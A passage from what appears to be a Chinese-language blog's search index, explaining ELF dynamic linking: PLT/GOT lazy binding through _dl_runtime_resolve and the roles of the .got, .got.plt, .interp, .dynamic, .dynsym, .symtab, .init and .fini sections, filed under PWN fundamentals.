npush moduleIDjump _dl_runtime_resolve</code></pre><p>在第一次调用haha时，<code>jmp *(haha@got)</code> 将跳转到下一条指令执行，此时<code>push n</code>将把haha在重定位表.rel.plt中的下表入栈，再压入moduleID，由_dl_runtime_resolve来完成符号解析与重定位工作，并把haha的实际存放到got表中。之后再调用时<code>jmp *(haha@got)</code> 将跳转到haha实际地址开始执行。<br>ELF中‘.got’存放全局变量引用地址，‘.got.plt’存放保存函数应用的地址。</p><p>绑定之后 <code>call test@plt</code> ,与 <code>call [test@got]</code> 执行效果相同。<br>ELF将GOT拆分成两个表“.got”和”.got.plt”,前者用来保存全局变量引用的地址，后者用来保存函数引用的地址。</p><h2 id="interp"><a href="#interp" class="headerlink" title=".interp"></a>.interp</h2><p>存放动态链接器的路径</p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>保存了动态链接器所需要的基本信息，如重定位表的位置，符号表的位置，共享对象初始化代码的地址等等</p><h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>保存了与动态链接相关的符号</p><h2 id="symtab"><a href="#symtab" class="headerlink" title=".symtab"></a>.symtab</h2><p>保存了该目标文件的所有符号的定义与引用</p><h2 id="init与-fini"><a href="#init与-fini" class="headerlink" title=".init与.fini"></a>.init与.fini</h2><p>.init段是一段属于共享对象的代码，装入共享对象时该代码将执行。例如，.init段由C++运行时系统用于调用.so 中的所有静态初始化函数。各个动态库的init执行顺序是按照依赖关系先后执行的，不是加载顺序。<br>.fini终止代码</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Section </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
